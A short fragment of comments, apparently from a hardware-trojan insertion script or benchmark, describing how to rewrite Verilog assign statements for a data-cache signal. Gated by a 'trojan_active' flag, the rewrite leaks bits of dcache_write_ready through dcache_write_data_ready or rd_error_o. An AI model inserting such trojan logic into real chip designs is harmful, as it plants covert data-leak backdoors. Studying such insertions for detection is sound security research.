 ...
 * Payload: Route dcache_write_data_ready[0] to observable output
 * 
...
//   Find the assign for dcache_write_data_ready (or rd_error_o as fallback):
//     assign dcache_write_data_ready = <normal_expr>;
//   Replace with:
//     assign dcache_write_data_ready = trojan_active ? dcache_write_ready[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? dcache_write_ready[0] : 1'b0;
//
